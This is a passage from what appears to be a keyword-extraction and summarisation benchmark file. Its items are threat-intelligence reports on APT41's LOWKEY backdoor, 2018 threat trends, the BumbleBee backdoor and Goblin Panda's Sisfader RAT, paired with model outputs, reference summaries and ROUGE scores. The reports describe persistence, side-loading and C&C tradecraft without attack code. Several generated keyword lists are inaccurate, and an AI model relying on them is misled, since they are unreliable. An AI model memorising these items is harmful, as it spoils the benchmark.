threat actor group APT41. The malware uses multiple layers of encryption, including RC5 and RC4, to obfuscate payloads. Researchers were able to decrypt payloads by brute forcing RC5 keys derived from system volume serial numbers. This revealed additional obfuscation layers and full file paths/names from the malware developers. Decrypted payloads included the remote access trojan POISONPLUG, XMRig cryptocurrency miner, and a sophisticated passive backdoor named LOWKEY. LOWKEY has TCP and HTTP variants that covertly listen on ports 53 and 80. It uses named pipes for command and control. Commands support file management, process management, and a reverse shell. The TCP variant uses a rootkit component to intercept and forward traffic to LOWKEY. Overall, the malware uses advanced techniques like rootkits, traffic relay, and API hooking to evade detection. Decryption and analysis of the payloads revealed sophisticated capabilities and provided insights into APT41's development environment. The malware demonstrates APT41's continued evolution and investment into covert access tools. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4615384615384615, "gpt3/lexical/rouge_rouge2": 0.10774410774410775, "gpt3/lexical/rouge_rougeL": 0.23411371237458195, "gpt3/lexical/rouge_rougeLsum": 0.23411371237458195, "gpt3_generated_text": ["This article discusses the activities of APT41, a Chinese threat group that focuses on espionage and financial targets. The article specifically focuses on a backdoor malware called LOWKEY, which was used in highly targeted attacks. The malware utilizes encrypted payloads and position independent loaders for obfuscation. The article also mentions another malware variant called DEADEYE, which uses RC5 encryption and a unique string. DEADEYE has different variants that download additional payloads or append payloads to the malware. The article provides details on how DEADEYE.DOWN attempts to download files from a command and control (C2) server and how the RC5 key is derived using the volume serial number of the C drive. Overall, the article highlights the sophisticated techniques used by APT41 and provides insights into the malware and its variants."]}, {"split_name": "val", "sample_id": "val_44", "prompt_text": "Extract the keywords: A blend of old and new cybersecurity issues inundated enterprises in [DATE] 2018 . Researchers discovered that nearly all running computers had serious hardware flaws , the ransomware problem persisted , unauthorized cryptocurrency mining spread and diversified , and vulnerable connected devices in homes were hit with effective new attacks . Also , in reaction to a broadening landscape of operating systems and devices , cybercriminals shifted from exploit kit - based attacks to an old but still effectual tactic : social engineering . Exploit kits and automated methods were efficient when a large number of users were using vulnerable software , but in [DATE] 2018 many threat actors were trying to exploit human vulnerabilities instead . Our [DATE] annual security roundup examines these and other important security issues , providing valuable insight for enterprises and users to help them be aware of and prepared for critical threats . As a means for important communications to and from an enterprise \u2019s network , business email makes for an attractive platform for cybercriminals . Consequently , phishing and other social engineering schemes are among the top concerns for cybersecurity professionals , as unwanted emails designed and worded professionally can easily fool a recipient who regularly fields similar emails . In [DATE] 2018 , we saw an increase in the use of various forms of messaging threats . Most notably , we observed an 82 [PERCENT] - [PERCENT] percent increase in blocked access to phishing URLs by unique client [ORG] IP address compared to [DATE] the [DATE] previous [DATE] year . Phishing traditionally arrives via email since email - based threats are much more platform - agnostic than other types of attacks that rely , for instance , on specific exploits . Year [DATE] - on [DATE] - [DATE] year comparison of blocked access to phishing URLs by unique client [ORG] IP address ( e.g. , [CARDINAL] one machine that accessed a link [CARDINAL] three times was counted as one ) Recently , apart from emails , there have also been phishing attacks that use chat , SMS , and other communication modes . The increase in numbers as well as different versions of phishing attacks shows how cybercriminals are adapting to a changing landscape . More connected devices and a widening range of operating systems mean that exploiting [CARDINAL] one particular operating system will not be as profitable for cybercriminals as in the past . Consequently , they are turning to an old but still usually effective attack . Another form of messaging attacks that picked up pace in [DATE] 2018 was business email compromise ( [ORG] BEC ) . In a typical [ORG] BEC attack , an attacker initiates or intercepts communications to con an enterprise employee who has the power to release or transfer funds . Managing Director / Director President General Manager / Manager Top positions being spoofed While the overall number of these [ORG] BEC attacks was low , a successful attempt could result in high financial losses for the target company . By contrast , phishing attacks were widely launched against a number of possible victims because duping even a low percentage of users would be profitable for attackers . Overall ransomware - related threats decreased by [PERCENT] 91 [PERCENT] percent from [DATE] 2017 [DATE] to [DATE] 2018 , and the number of discovered ransomware families also dropped over the same period . This steep and steady decline continued the trajectory we noted in our midyear roundup report . It could be attributed to improved ransomware solutions , growing awareness of the threat , and to a certain extent , the realization that negotiating with attackers would prove futile . Ransomware - related threats New ransomware families Nevertheless , since the profit that attackers stood to gain outweighed the effort involved in launching attacks , we continued to see ransomware being used . Our detections for [ORG] WannaCry , the family that caused the infamous ransomware outbreak of [DATE] May [DATE] 2017 , were at a stable number ( [CARDINAL] 616,399 ) and overshadowed those for all other ransomware families by a wide margin . Cryptocurrency mining , for its part , reached a new peak in [DATE] 2018 at [CARDINAL] over [CARDINAL] 1.3 [CARDINAL] million detections \u2014 a 237 [PERCENT] - [PERCENT] percent growth from [DATE] the [DATE] previous [DATE] year . Cryptocurrency mining detections Apart from the rise in detections , we also observed a \u201c gold rush \u201d in cryptocurrency - mining attack methods throughout [DATE] the [DATE] year : penetrating ad platforms , popup ads , a malicious browser extension , mobile phones , botnets , bundling with legitimate software , exploit kits , and repurposed ransomware . in fileless threats Aug [DATE] 2017 [DATE] - [DATE] Dec [DATE] 2018 There was also an upsurge in one of the attack methods used to evade traditional blacklisting techniques : fileless threats . These particular threats attempt to evade conventional solutions and can usually be detected only via other means such as traffic monitoring , behavioral indicators , or sandboxing . [DATE] The [DATE] year in security began with the groundbreaking disclosure of [ORG] Meltdown and [GPE] Spectre , processor - level vulnerabilities that relied on flaws in the speculative execution of CPU instructions . These new classes of flaws affected different microprocessors and spawned new CPU attacks as well as a slew of mitigation troubles . And even by [DATE] the [DATE] end [DATE] of [DATE] the [DATE] year , there was no straightforward solution for these micro - architectural weaknesses . Another unfortunate [ORDINAL] first in [DATE] 2018 was the discovery of a critical vulnerability in the open - source cloud orchestration software [ORG] Kubernetes . Fortunately , this particular flaw was quickly patched . Most vulnerabilities are found and then responsibly disclosed by security researchers and vendors so that they can not be used in any widespread attacks . But disclosing a vulnerability to the public also means alerting threat actors to it , so creating a fix before information is released is vital . Threat actors actively abuse vulnerabilities to create operational exploits . Recently , no widespread zero [DATE] - day exploit attacks were identified , unlike in the past , when [CARDINAL] two [CARDINAL] or [CARDINAL] three major zero [DATE] - day attacks would define [DATE] a [DATE] year . Rather , the attacks that were discovered in [DATE] 2018 were of limited scope . Cybercriminals were also abusing vulnerabilities that had already been patched , banking on the assumption that many users did not speedily apply the available fixes , if at all . * Hover to flip to the attack date Drupal vulnerability used to deliver cryptocurrency miners CVE-2018 [ORG] - 7602 PATCH DATE : [DATE] April 25 , [DATE] 2018 ATTACK DATE : [TIME] 5 [TIME] hours after release of patch [PRODUCT] Apache CouchDB vulnerabilities used to deliver cryptocurrency miners CVE-2017 [ORG] - 12635 , CVE-2017 [ORG] - 12636 PATCH DATE : [DATE] Nov. 14 , [DATE] 2017 [DATE] ATTACK [DATE] DATE : [DATE] Feb. 15 , [DATE] 2018 [DATE] 3 [DATE] months [DATE] later Oracle [ORG] WebLogic WLS [ORG] - WSAT vulnerability used for cryptocurrency mining CVE-2017 [ORG] - 10271 PATCH DATE : [DATE] Oct. 16 , [DATE] 2017 ATTACK DATE : [DATE] Feb. 26 , [DATE] 2018 [DATE] 4 [DATE] months [DATE] later Vulnerability that allows permanent rooting of [ORG] Android phones used in [MONEY] AndroRat [MONEY] CVE-2015 - 1805 PATCH DATE : [DATE] March 16 , [DATE] 2016 [DATE] ATTACK [DATE] DATE : [DATE] Feb. 13 , [DATE] 2018 [DATE] 23 [DATE] months [DATE] later Notable attacks in [DATE] 2018 involving exploits for known and patched vulnerabilities Of the vulnerabilities found in [DATE] 2018 , a considerable percentage was for software used in industrial control systems ( ICSs ) . And most of those vulnerabilities were in human - machine interface ( [ORG] HMI ) software for ICSs and supervisory control and data acquisition ( [ORG] SCADA ) environments . The [ORG] HMI is the main hub for monitoring , managing , and implementing the states of different processes in facilities . Exploiting a critical [ORG] HMI vulnerability could allow an attacker to affect the functionality of the physical components of an enterprise facility . Router - based attacks continued unabated despite the repercussions faced by the creators of [ORG] Mirai and [PERSON] Satori . In [DATE] 2018 , we found that recycled [ORG] Mirai code was still being used against routers . And [ORG] VPNFilter , another form of router malware , was updated with added capabilities , such as reconnaissance and persistence components , that led to the abuse of routers beyond distributed denial of service ( DDoS ) . We also found routers being used in cryptocurrency mining and pharming attacks , which continued the trend of increased functionalities we noted in our midyear roundup report . There were [CARDINAL] two examples of attack incidents in [DATE] 2018 : malware - monero - mining - icon - roundup CRYPTOJACKING Attackers exploited a patched security flaw in [ORG] MikroTik routers in [GPE] Brazil and injected malicious Coinhive script to mine [PERSON] Monero . maliciouspage - icon - roundup [DATE] MALICIOUS [DATE] REDIRECTION The exploit kit Novidade could change router Domain Name System ( [ORG] DNS ) settings so that an unsuspecting user could be redirected to fake pages controlled by the attacker . As more smart devices are getting connected to the internet of things ( [ORG] IoT ) , more home owners are effectively becoming \u201c smart home network administrators . \u201d As such , they must take on the responsibility of making sure that their routers do not become an entry point for attackers . Since routers function as the main hub for managing connections to and from the different devices that need the internet , it is critical that they are secured . [ORG] Trend [ORG] Micro [ORG] Research [ORG] Machine [ORG] Learning [ORG] Solutions ahead - of - the - curve - pdf - thumb Ahead of the Curve : A Deeper Understanding of Network Threats Through Machine Learning adversarial - sample - generation - making - machine - learning - systems - robust - for - security - cover Adversarial Sample Generation : Making Machine Learning Systems Robust for Security uncovering - unknown - threats - with - human - readable - machine - learning - cover Uncovering Unknown Threats With Human - Readable Machine Learning Connected Hospitals , Energy Providers , Water Companies exposed - and - vulnerable - critical - infrastructure - the - water - energy - industries - pdf - thumb Exposed and Vulnerable Critical Infrastructure : Water and Energy Industries mqtt - and - coap - security - and - privacy - issues - in - iot - and - iiot - communication - protocols - cover [ORG] The [ORG] Fragility [ORG] of [ORG] Industrial [ORG] IoT \u2019s Data Backbone securing - connected - hospitals - ai Securing Connected Hospitals : A Research on Exposed Medical Systems and [ORG] Supply [ORG] Chain [ORG] Risks [ORG] Cybercriminal [ORG] Investigations and [PERSON] Takedowns rise - and - fall - of - scan4you - pdf - cover The Rise and Fall of Scan4You The - Evolution - of - Cybercrime - and - Cyberdefense - cover [WORK_OF_ART] The [WORK_OF_ART] Evolution [WORK_OF_ART] of [WORK_OF_ART] Cybercrime [WORK_OF_ART] and [WORK_OF_ART] Cyberdefense [WORK_OF_ART] OVERALL [WORK_OF_ART] THREATS [WORK_OF_ART] BLOCKED IN [DATE] 2018 Threat components blocked \t [DATE] 1H [DATE] 2018 \t 2H 2018 \t [DATE] 2018 total [PRODUCT] Email threats \t [CARDINAL] 16,997,711,547 \t 24,521,948,297 \t 41,519,659,844 Malicious files \t [CARDINAL] 2,956,153,112 \t [PRODUCT] 2,867,738,653 \t [ORG] 5,823,891,765 Malicious URLs \t [CARDINAL] 534,534,550 \t [CARDINAL] 509,064,959 \t [CARDINAL] 1,043,599,509 Overall threats \t [CARDINAL] 20,488,399,209 \t 27,898,751,909 \t [DATE] 48,387,151,118 Half [DATE] - [DATE] year comparison of blocked email , file , and URL threats Year \t [ORG] WannaCry family \t Other ransomware families [DATE] 2017 \t [CARDINAL] 321,814 \t [CARDINAL] 244,716 [DATE] 2018 \t [CARDINAL] 616,399 \t 126,518 Year - on - year comparison of [ORG] WannaCry detections versus other ransomware detections combined [DATE] Monthly comparison of fileless threat detections 147%33%35%38%94%27 % Year - on - year comparison of vulnerabilities of selected software vendors For more insight into the most important cybersecurity issues of [DATE] 2018 , download our [DATE] annual security roundup .", "generated_text": "2018; business email; phishing; social engineering; new attacks; social engineering; blocked access; phishing URLs; the previous year; unauthorized cryptocurrency mining; 1.3 million; the number; 10 million; the number; detections; WannaCry; WannaCry-related threats; 91 percent; unauthorized cryptocurrency mining; 2018; new attacks; unauthorized cryptocurrency mining; the threat actor.", "ref_text": "<START-1>The document provides an overview of major cybersecurity threats and issues in 2018. Messaging threats like phishing increased, with an 82% rise in blocked phishing URLs. Business email compromise attacks also grew targeting enterprise employees. Ransomware declined significantly, with detections down 91% and fewer new families, though WannaCry remained prevalent. Cryptocurrency mining detections grew 237%. Fileless threats that evade traditional antivirus rose 819%. Major hardware vulnerabilities like Meltdown and Spectre were disclosed. Attacks exploited known vulnerabilities for cryptocurrency mining rather than zero-days. Many critical flaws were found in industrial and IoT systems. Router malware continued via recycled Mirai code and new threats like VPNFilter. IoT devices were abused for cryptomining and pharming. As homes add more smart devices, routers become a key attack vector. Trend Micro research covered areas like machine learning for security, critical infrastructure risks, cybercriminal takedowns, and threat evolution. In 2018, over 48 billion threats were blocked, mostly email threats. WannaCry dominated ransomware while other families declined. The report highlights key issues like social engineering, hardware flaws, IoT threats, messaging attacks, and ransomware. It provides data on threat trends and research insights for enterprises to be aware of latest risks. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4258373205741627, "gpt3/lexical/rouge_rouge2": 0.10096153846153846, "gpt3/lexical/rouge_rougeL": 0.20095693779904306, "gpt3/lexical/rouge_rougeLsum": 0.20095693779904306, "gpt3_generated_text": ["The article highlights the major cybersecurity issues that enterprises faced in 2018. It discusses the discovery of serious hardware flaws in nearly all computers, the persistent problem of ransomware, the spread of unauthorized cryptocurrency mining, and the vulnerabilities of connected devices in homes. The article also mentions the shift of cybercriminals from exploit kit-based attacks to social engineering, as a result of the broadening landscape of operating systems and devices. It emphasizes the increasing concern of phishing and other social engineering schemes, particularly through business email. The article notes the rise in messaging threats, including an 82% increase in blocked access to phishing URLs compared to the previous year. It also mentions the emergence of business email compromise (BEC) attacks, where attackers con enterprise employees to release or transfer funds. The article further discusses the decline in ransomware-related threats but highlights the steady number of detections for the WannaCry family. It notes the significant growth of cryptocurrency mining detections and the various attack methods used, including fileless threats. The article concludes by mentioning the vulnerabilities in processor-level vulnerabilities and the critical vulnerability found in the open-source cloud orchestration software Kubernet. Overall, the article provides valuable insights into the important security issues of 2018 and highlights the need for enterprises and users to be aware of and prepared for critical threats."]}, {"split_name": "val", "sample_id": "val_45", "prompt_text": "Extract the keywords: www.trendmicro.com /en_hk / research/22 / i / buzzing - in - the - background - bumblebee - a - new - modular - backdoor - evolv.html Buzzing in the [FAC] Background : [ORG] BumbleBee , a [ORG] New [ORG] Modular [ORG] Backdoor [ORG] Evolved From [ORG] BookWorm \u22ee 9/2/2022Updated on [DATE] Sept. [DATE] 2 , [DATE] 2022 , at [TIME] 9:55 [TIME] p.m. [TIME] ET to clarify the difference between this [PRODUCT] Bumblebee malware and the [PRODUCT] Bumblebee ransomware loader . IntroductionIn [DATE] March [DATE] 2021 , we investigated a backdoor with a unique modular architecture and called it [ORG] BumbleBee due to a string embedded in the malware . Its type of modular framework has made our static analysis more challenging because it required us to [ORDINAL] first rebuild its structure or use dynamic analysis to understand its functionality and behavior . Our analysis found that [ORG] BumbleBee only had little malicious code in its payload , and what it does on the surface is track keys and clipboard content . However , further investigation revealed a controller application that expands the malware \u2019s capabilities . This type of backdoor is similar to another of its kind called [ORG] BookWorm , in which it can be inferred that [ORG] BumbleBee is a refactored version of [ORG] BookWorm . At the time of writing , [ORG] BumbleBee has only been deployed in [GPE] Taiwan ; together with its use of [PERSON] Simplified [PERSON] Chinese as the language for its user interface , this malware can be suspected to be deployed by malicious [NORP] Chinese actors . This blog will tackle [ORG] BumbleBee \u2019s capabilities and our analysis of this backdoor . It 's important to note that this [PRODUCT] Bumblebee malware family is different from the [PRODUCT] Bumblebee loader , a loader malware that is used by ransomware groups to drop backdoors to gain access to corporate networks . [ORG] BumbleBee \u2013 a refactored modular [ORG] backdoorBumbleBee is a modular backdoor that comprises [CARDINAL] two applications , a server and a client application ( a master and slaver application , respectively in the malware \u2019s jargon ) . Once the client application is deployed on the target computer ( these are commonly local government devices ) , threat actors can control the machine using the server module . Let us take a deeper look into this backdoor . Layered deployment \u2013 client applicationWe have encountered the client application in a security breach incident . Its unique \u201c layer - in - layer \u201d architecture caught our attention . The module has a self - extracted file that contains [CARDINAL] three main parts : a legitimate executable ( [ORG] XcrSvr.exe ) , side - loaded [ORG] DLL ( XecureIO_v20.dll ) and the shellcode binary file ( ore ) in the file system to execute the legitimate executable . Figure [CARDINAL] 1 . Architecture of BumbleBee1/6Figure 2 . Metadata of [ORG] XcrSvr.exeXCrSvr.exe is the executable in the XecureVistaCryptoSvr module developed by SoftForum . This file is exploited to launch the side - loaded [ORG] DLL , XecureIO_v20.dll , which will work as the next - stage loader that executes the shellcode \u201c ore , \u201d which is the main component in this backdoor . This shellcode contains multiple modules of its own ( shown in [LAW] Table [LAW] 1 ) . Each module has corresponding 32 [QUANTITY] - bit and [CARDINAL] 64 - bit versions of binaries in the shellcode except for launcher.dll . [PRODUCT] DescriptionName launcher.dll The [ORDINAL] first - stage launcher that loads all the subsequent modules . It decrypts a list of modules in [PERSON] kernel.dll installer.dll The module used to install components in the compromised machine.memory and executes each in order . The utility component that controls all the other [ORG] modules.keylog.dllloader.dll slaver.dllThe keylog component monitors the keystrokes and clipboard content of the victim , and records actions from the victim such as running a process , entering a password , and getting the text of a window . The stolen data will then be run through a XOR logic gate with a [QUANTITY] two [QUANTITY] - byte key 0xF29D and saved under % temp%\\kb\\[UserName]\\. The timestamp will be used as the file name . The module that reads the shellcode . The main module that interacts with the other methods once the backdoor is launched . Table 1 . [ORG] BumbleBee 's modulesIf a victim is compromised for the [ORDINAL] first time , launcher.dll loads and launches all the other modules . The installer modules will be responsible for the installation and establishing persistence on the compromised machine via the following steps:1 . Drop a copy of the XecureIO_v20.dll in % APPDATA%\\LOCAL\\TEMP folder . [CARDINAL] 2 . Encrypt original shellcode file ( to be a \u201c bin \u201d file ) and path information ( to be a \u201c path \u201d file ) by using RC4 algorithm(key is the value of \u201c ProductID \u201d from \u201c HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Internet Explorer\\Registration\u201d)3 . [ORG] Drop bpu.dll ( used to bypass [ORG] UAC ) and launched by rundll32.exe . [CARDINAL] 4 . [NORP] Establish persistence on compromised machine . [CARDINAL] 5 . Delete the original SFX file . Notably , as XecureIO_v20.dll is loaded by [ORG] XcrSvr.exe , it will check if the parent process is \u201c XcrSvr.exe . \u201d If so , it will patch the entry point of [GPE] XcrSvr.exe with a long jump instruction to direct execution flow to the malicious code.2/6Figure [CARDINAL] 3 . XecureIO_v20.dll hooks its parent process \u2019 entry pointFigure [CARDINAL] 4 . The original entry pointFigure [CARDINAL] 5 . The patched entry pointBased on our analysis , we think the reason is that the malicious code embedded in [ORG] XecureIO_v20 will not run if it followed the normal execution flow of [GPE] XCrSvr.exe . Hence , once XecureIO_v20.dll is loaded by XCrSvr.exe , it will patch the entry point of XCrSvr.exe and jump to the address of the malicious code to make sure the code can be executed properly . After the client is installed and the persistence is established , the loader , XecureIO_v20.dll , will retrieve the value of \u201c ProductID \u201d from the registry key \u201c HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Internet Explorer\\Registration \u201d and use it as the key to decrypt the encrypted payload ( the file \u201c bin \u201d ) dropped in the [ORDINAL] first installation . Using the information on the compromised machine as a key to encrypt the payload makes it much more difficult for analysts to decrypt and debug the malware in the analysis environment . File name Description path An RC4 - encrypted path string used to find the location of next - stage shellcode . It could be a file path binor a registry path starting with HKLM or [ORG] HKCU . The next - stage RC4 - encrypted shellcode payload . Table 2 . Payload file namesExpanded control \u2013 server application Due to [ORG] BumbleBee \u2019s complex client application , it took some time for us to fully analyze its functionality . While doing so , we ran across the server application of the malware that acts as a controller . This provided us with further understanding on how [ORG] BumbleBee works . As the client application is running on the infected device , it will communicate with the server application and show the information of the machine it is in . Details , such as computer name , external [ORG] IP address , geographic location , OS , CPU , and memory , are collected by the client application.3/6Figure [CARDINAL] 6 . Connection establishedFigure [CARDINAL] 7 . Built - in options in server applicationBased on the options in the server application shown in Figure [CARDINAL] 7 , we can determine that it supports the following functions for controlling the compromised machine : Control the victim \u2019s desktop remotelyList and manage current services statusList and manage the victim \u2019s registry keyList and manage running processes with the image names , current folder , process i d and parent process [ORG] idDescription [ORG] Upload / download / delete / list files from the victim \u2019s environmentFunctions   ( Reverse proxy ) Reverse proxy to help expose a local server behind a [ORG] NAT or firewall to the   ( Keylogger)Execute the command shellExecute the command shellinternet [PERSON] Log keystrokes and clipboard contentsTable [CARDINAL] 3 . Supported functionsBumbleBee \u2019s modular framework allowed it to embed a small amount of malicious code that involves stealing keystrokes and clipboard content in the client \u2019s shellcode . However , it could expand its capabilities through its server application by loading additional modules . This design proves that [ORG] BumbleBee is flexible , allowing its developers to focus on the development of additional modules instead of having to rebuild the malware itself . Its structure could also reduce the risk of exposing itself to analysts and their own modules for comparison . Network communicationBumbleBee communicates over the HTTP protocol . It [ORDINAL] first creates an HTTP request that acts as a network beacon to notify the command and control ( [ORG] C&C ) server . The [ORG] POST request with the following URL , url server>/update/ , is the initial network beacon . The client application will send information of the compromised machine , which is encrypted by RC4 ( see Figure [CARDINAL] 8 and Figure [CARDINAL] 9 ) once the [ORDINAL] first connection is established successfully . All other communication traffic , except for the victim information , are encrypted between server and client applications using the RC4 and compressed by [ORG] LZO ( Lempel \u2013 Ziv \u2013 Oberhumer ) algorithm . To make sure the received payload is correct , [ORG] BumbleBee adopts a CRC32 checksum with reversed - presentation mode to verify the received data . For the CRC32 calculation , a self - defined value , \u201d [DATE] 20200105 \u201d is used as the initial value ( typically , the value is [CARDINAL] 0xffffffff ) for checksum calculation.4/6Figure [CARDINAL] 8 . Encrypted information of the compromised machineFigure [CARDINAL] 9 . Decrypted information ( by RC4)PersistenceDuring the investigation , we found that [ORG] BumbleBee adopted several techniques for persistence . It will use different techniques depending on the configuration . Here are the techniques adopted by the [ORG] BumbleBee sample we found : Abuse registry run key to repeatedly execute the malware once system boot [ORG] Create [ORG] Windows services to repeatedly execute malicious payloads Use Windows logon scripts automatically executed at logon initialization to establish persistence via adding a [ORG] Registry key HKEY_CURRENT_USER\\Environment \" UserInitMprLogonScript\"AttributionDue to the unique modular structure and installation procedures , we started to work on a literature review to clarify if it is an exclusive tool used by a certain threat actor . We found a similar backdoor , \u201c [ORG] BookWorm , \u201d revealed by [GPE] Palo [GPE] Alto in [DATE] 2015 . They share the following features:1 . Both are self - extracted files and abuse legitimate executables to load self - made malware . [CARDINAL] 2 . Both use the same registry value as RC4 encryption key to encrypt their payload . [CARDINAL] 3 . Both use modular architecture in the conception of the backdoor . [CARDINAL] 4 . Both appeared in [LOC] Southeast [LOC] Asia , targeting local government - related organizations ( similar victimology ) . [CARDINAL] 5 . Both use RC4 and [ORG] LZO algorithms in [ORG] C&C communications ( similar network protocol).We think [ORG] BumbleBee is likely to be the refactored [ORG] BookWorm backdoor . They have similar tactics , techniques , and procedures ( TTPs ) , unique encryption approach , and similar target sectors . According to the language ( Simplified Chinese ) shown in server application , we suspect that the origins and developers of [ORG] BumbleBee may be in [GPE] China and of [NORP] Chinese descent . ConclusionSince BumbleBee and [ORG] Bookworm share the same features , [ORG] BumbleBee is likely a refactored form of the latter . Focusing on [NORP] Asian local government targets , all signs point to a suspect linked to a [NORP] Chinese hacker group . [ORG] BumbleBee , being a modular framework , is not only flexible but sophisticated as it will require analysts to investigate its structure and behavior . Another aspect of having a modular framework is that they can just keep developing additional modules since it can easily be integrated with the current version of said malware.5/6With its modular capabilities , the threat may deploy additional modules that may prove dangerous . Thus , an advanced layer of protection and quick detection is needed to prevent the backdoor from taking root in the system . binC&C : \u00b7 http[:]//www[.]synolo[.]ns01[.]biz:80 / update \u00b7 http[:]//118[.]163[.]105[.]130:80 / [ORG] updateMITRE [ORG] TacticsDefense [ORG] EvasionPersistencePrivilege [ORG] Escalation [ORG] Collection [ORG] ReconnaissanceCommand and ControlResource DevelopmentTechniques T1574.002 - Hijack Execution Flow : [ORG] DLL Side [ORG] - Loading T1070.004 - Indicator Removal on Host : File Deletion T1055 - Process Injection T1480.001 - Execution Guardrails : Environmental Keying T1547.001 - Boot or [PERSON] Logon [PERSON] Autostart Execution : Registry Run [ORG] Keys [ORG] / [ORG] Startup [ORG] Folder T1037.001 - Boot or Logon Initialization Scripts : [PERSON] Logon [PERSON] Script ( Windows ) T1548.003 - Create or Modify System Process : [ORG] Windows [ORG] Service T1548.002 - Abuse Elevation Control Mechanism : Bypass User Account Control T1056.001 - Input Capture : Keylogging T1592 - Gather Victim Host Information T1071.001 - Application Layer Protocol : Web Protocols T1090 - Proxy T1573.001 - Encrypted Channel : [ORG] Symmetric [ORG] Cryptography [ORG] T1132.001 [ORG] - [ORG] Data Encoding : Standard Encoding T1587.001 - Develop Capabilities : Malware6/6", "generated_text": "BumbleBee; a modular backdoor; two applications; a server; a client application; the server; the client application; threat actors; the server module; control; the module; modules; the shellcode; a self-extracted file; the shellcode; a shellcode binary; the shellcode; the main component; the module; the client application; the loader; the Bumblebee loader; intrusion; target; Chinese; TCP; this backdoor; ransomware groups; access; corporate networks.", "ref_text": "<START-1>The PDF describes a new modular backdoor malware called BumbleBee that was investigated starting in March 2021. BumbleBee has a unique layered architecture and modular framework that makes analysis challenging. It is comprised of a client application that gets installed on target devices, and a controller server application. The client application uses a layered deployment method, abusing a legitimate executable to load a side-loaded DLL, which then decrypts and executes shellcode containing the main malicious modules. The installer module establishes persistence and deletes original files. Encrypted payloads are decrypted at runtime using a key derived from the infected system. The server application allows threat actors to control compromised devices remotely. It supports functions like file management, command execution, keylogging, etc. Communications between client and server are encrypted using RC4 and LZO algorithms. BumbleBee shares many similarities with an older backdoor called BookWorm, leading researchers to believe it is a refactored version of BookWorm. Both have targeted local governments in Asia. Other common TTPs include modular architecture, encryption methods, and victimology. This suggests BumbleBee may originate from a Chinese hacking group. BumbleBee's modular design makes it flexible and extensible for attackers to add new capabilities without rewriting the entire malware. The initial malware has limited functionality to evade detection, but modules can expand functionality later. Advanced protections are needed to detect and block this sophisticated backdoor malware. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4923857868020305, "gpt3/lexical/rouge_rouge2": 0.16836734693877553, "gpt3/lexical/rouge_rougeL": 0.2741116751269035, "gpt3/lexical/rouge_rougeLsum": 0.2741116751269035, "gpt3_generated_text": ["The article discusses a new modular backdoor called BumbleBee, which has evolved from a previous backdoor called BookWorm. BumbleBee is a two-application backdoor consisting of a server and a client application. The client application is deployed on the target computer, allowing threat actors to control the machine using the server module. The client application has a layered deployment architecture, with a self-extracted file containing a legitimate executable, a side-loaded DLL, and a shellcode binary file. The main component of the backdoor is the shellcode, which contains multiple modules. These modules include a launcher, an installer, a keylogger, a loader, and a slaver. The backdoor is suspected to be deployed by malicious Chinese actors, as it has only been found in Taiwan and uses Simplified Chinese as its user interface language. It is important to note that this BumbleBee malware is different from the Bumblebee loader used by ransomware groups. The article provides detailed information about the architecture and functionality of the BumbleBee backdoor."]}, {"split_name": "val", "sample_id": "val_46", "prompt_text": "Extract the keywords: [CARDINAL] 8/21/2018Goblin Panda against the Bears \u2013 Sebdraven \u2013 MediumFollowSebdraven OSINT , Python , [PERSON] Malware [PERSON] Analysis , [PERSON] Botnet [PERSON] Tracker , [ORG] SIEM and [ORG] IPS / IDS and Threats Expert / co- organizer # [ORG] BotConf / co - creator of # FastIR Aug [CARDINAL] 2 \u00b7 [CARDINAL] 4 min readGoblin Panda against the [ORG] BearsDuring my last investigation ( here ) , I \u2019ve found [CARDINAL] two RTFs malware documents with the same techniques of exploitation of [ORG] CVE-2017 \u2013 [DATE] 11882 : A   le 8.t in % TMP% with Package Ole ObjectThe same loop of decryptionThe same runPE after overwriting in memory EQNEDT32.exeBut the payload is really di erent . It \u2019s not a version of PlugX but a version of Sis der studied by [ORG] Ncc group . url events / blogs/2018 / june / cve-2017 - 8570 - rtf - and - the - sisfader - rat / With the behaviour graph of [PERSON] Joe [PERSON] Sandbox , we can recognize the same interactions with operating system than my last article and the paper of [ORG] NCC [ORG] Group . Behaviour of malwaresThe di erence with the version studied by [ORG] NCC [ORG] Group is [ORG] the [ORG] Package [ORG] Ole [ORG] Object . In the article of [ORG] NCC [ORG] Group , the researchers talk about a [ORG] SCT [ORG] File and many javascript manipulations for dropping the [ORG] RAT on the disk and to start it.url [NORP] Panda against the Bears \u2013 Sebdraven \u2013 [ORG] MediumHere , the payload is encrypted in 8.t   leIf we analyze EQNEDT32.exe overwritten to recognise the payload , we have the same technics anti emulation with the same value . In a thread , the process posts in a queue the value [DATE] 5ACE8D0Ah . Anti emulation tricksAnti emulation tricksThe veri cation is calling [ORG] GetMessage ( ) and the value is stored in [ORG] EAX in the function sub_401A60.url [PERSON] Panda against the Bears \u2013 Sebdraven \u2013 [PERSON] MediumThe comparaison is made in the calling function sub_4027D0.Anti emulation tricks veri cationJuste after we found again the loop of decryption for the con g.call to loop of decryptionurl [NORP] Panda against the Bears \u2013 Sebdraven \u2013 [PRODUCT] MediumLoop of decrypting con gIt \u2019s the same algorithm described : a simple XOR loop with rolling key . The mechanism of persistent is the same with a service creation just after dropping di erents   les and a privilege escalation . We found the same name of the dll   les.url [PERSON] Panda against the Bears \u2013 Sebdraven \u2013 MediumPersistence and loading agentThe malware overwrite the comobject{9BA05972 - F6A8\u201311CF - A442\u201300A0C90A8F39 } to execute when this com object is called to make a persistenceComObject [ORG] AddingAll evidences show is the same payload [ORG] Sisfader [ORG] RAT.Threat [ORG] IntelThe toolset for exploiting the module of equation is the same using of the compromission for Vietnameses O cials used by [PERSON] Goblin [PERSON] Panda . ( [ORG] APT 1937CN)url [PERSON] Panda against the Bears \u2013 Sebdraven \u2013 MediumIf we check the domain contacted by EQNEDT32.exe is kmbk8.hicp.net . This address is a real good pivot . It makes the link with [PERSON] Goblin [PERSON] Panda and [ORG] SisFader RAT.And the infrastructure is very interesting this domains resolved on of [GPE] Russia ( [PERSON] FSB)RTFs contentSo [PERSON] Gobelin [PERSON] Panda targets like the report of [ORG] CrowdStrike url [CARDINAL] 266 / images / ReportGlobalThreatIntelligence.pdf he telecom industries in [GPE] Russia . [PERSON] ConclusionGoblin [PERSON] Panda used Sisfader RAT to target the Telecom Firms russian with the same exploitation techniques for Vietnameses O 